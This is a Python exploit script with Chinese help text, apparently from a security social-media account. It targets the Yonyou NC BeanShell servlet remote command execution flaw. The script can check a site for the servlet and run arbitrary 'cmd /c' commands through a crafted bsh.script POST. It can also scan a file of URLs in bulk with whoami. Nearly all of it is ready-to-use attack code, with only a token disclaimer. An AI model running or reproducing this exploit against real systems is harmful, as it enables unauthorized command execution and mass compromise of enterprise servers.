import requests
import sys
import re
from urllib.parse import quote

def help():
    print(" ")
    print("**** **** python 用友beanshell-rce.py -h 查看本exp的用法")
    print(" ")
    print("**** **** python 用友beanshell-rce.py --check http://exp.com/ 检测您要攻击的网站是否存在漏洞")
    print(" ")
    print("**** **** python 用友beanshell-rce.py -u http://exp.com/ command 对目标网站执行命令")
    print(" ")
    print("**** **** python 用友beanshell-rce.py --file url.txt 批量检测nc命令执行")


def check(url):
    try:
        host_uri = "/servlet/~ic/bsh.servlet.BshServlet"
        hostall = url + host_uri
        header = {
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:94.0) Gecko/20100101 Firefox/94.0',
            'Content-Type': 'application/x-www-form-urlencoded'
        }
        r = requests.post(hostall,headers=header,timeout=5)
        r_text = r.text
        if r.status_code==200 and 'BeanShell Test Servlet' in r_text:
            print("[+]"+url +"可能存在用友nc_Beanshell 远程命令执行漏洞")
        else:
            print("[-]"+url +"不存在存在用友nc_Beanshell 远程命令执行漏洞")
    except:
        print("[-]可能出现其他错误，请检查url是否输入正确")


def rce(url,cmdd):
    host_uri = "/servlet/~ic/bsh.servlet.BshServlet"
    hostall = url + host_uri
    header = {
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:94.0) Gecko/20100101 Firefox/94.0',
        'Content-Type': 'application/x-www-form-urlencoded'
    }
    payload = "bsh.script=" + quote('exec("cmd /c {}");'.format(cmdd))
    try:
        r = requests.post(hostall, headers=header, data=payload)
        r_text = r.text
        re1 = re.compile(r"<pre>(.*?)</pre>",re.S)
        re2 = re1.findall(r_text)
        re_all = re.search(re1, r_text)
        re3=re_all[0].replace('<pre>', '').replace('</pre>', '')
        print(re3)
    except:
        print("[-]出现其他错误,请检查url是否正确")



def piliang(file):
    f = open(file)
    f2=f.readlines()
    for f3 in f2:
        host_uri = "/servlet/~ic/bsh.servlet.BshServlet"
        hostall = f3 + host_uri
        header = {
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:94.0) Gecko/20100101 Firefox/94.0',
            'Content-Type': 'application/x-www-form-urlencoded'
        }
        payload = "bsh.script=" + quote('exec("cmd /c {}");'.format("whoami"))
        try:
            r = requests.post(hostall, headers=header, data=payload)
            r_text = r.text
            re1 = re.compile(r"<pre>(.*?)</pre>", re.S)
            re2 = re1.findall(r_text)
            re_all = re.search(re1, r_text)
            re3 = re_all[0].replace('<pre>', '').replace('</pre>', '')
            print(f'[+]{f3}存在漏洞,命令回显为:{re3}')
            print('[+]**** ****[+]')
        except:
            print(f'[-]{f3}不存在存在漏洞')
            print('[-]**** ****[-]')
    f.close()

if __name__=="__main__":
    print(" ")
    print("by 欢迎关注chaosec公众号，禁止用于一切违法操作")
    cmd1 = sys.argv[1]

    try:
        # cmd3 = sys.argv[3]
        if cmd1 == "-h":
            help()

        elif cmd1 == "--check":
            cmd2 = sys.argv[2]
            check(cmd2)
        elif cmd1 == "-u":
            cmd2 = sys.argv[2]
            cmd3 = sys.argv[3]
            rce(cmd2,cmd3)
        elif cmd1 == "--file":
            cmd2 = sys.argv[2]
            piliang(cmd2)
        else:
            print("请-h查看帮助")
    except:
        print("请输入正确的参数，请-h查看帮助")




